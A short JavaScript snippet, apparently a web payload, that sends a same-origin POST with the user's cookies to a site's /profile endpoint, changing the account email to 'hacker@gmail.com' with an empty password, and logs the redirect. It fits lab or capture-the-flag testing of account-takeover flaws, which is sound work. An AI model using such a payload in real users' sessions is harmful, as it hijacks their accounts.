async function modifyProfile(email, password = "") {
  const response = await fetch("/profile", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: new URLSearchParams({
      email: email,
      password: password
    }),
    credentials: "same-origin",
    redirect: "manual"
  });

  console.log("Status:", response.status);
  console.log("Location:", response.headers.get("Location"));
}

modifyProfile("hacker@gmail.com");
